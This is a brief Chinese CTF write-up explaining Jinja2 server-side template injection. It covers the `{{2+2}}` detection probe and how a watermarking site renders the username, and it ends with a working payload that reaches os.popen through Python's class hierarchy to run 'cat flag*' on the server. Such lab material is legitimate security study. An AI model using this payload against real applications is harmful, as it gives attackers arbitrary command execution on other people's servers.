# 关于jinja2
jinja2是一个类似php smart引擎的视图模板，可以将内容动态的插入到html中去详细可以看一下[Jinja2 模板的学习](https://www.jianshu.com/p/8fc66b083ecd)

# 关于jinja2模板注入
这是一种代码注入，常见的测试手法是在可以回显的地方插入`{{2+2}}`如果返回了4就说明可能存在jinja模板注入，这种代码注入类似xss，但是注入的代码是执行在服务器端的。

# ctf
**地址： ** http://106.75.72.168:8888

## 解题思路

> 题目简介：这是一个可以给你的图片打赏你名字的水印的网站。先注册，登录，然后有一个donne操做就是将你上传的图片url转换成带有你的名字的水印的图片。这样回显的条件就满足了，然后当你上传二的是一个错误的不是指向图片的url时，就会出现大量报错，其中就包含了后台使用的是jinja模板；

**思路： ** 上传暗色背景的图片，尝试注册{{100+100}}测试回显
![title](https://i.loli.net/2019/04/27/5cc3acab03ba0.png)

可以看到成功了，然后利用jinja可以访问python的内部方法和内置变量

所以最后的payload，说是这么说
```
aa{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
```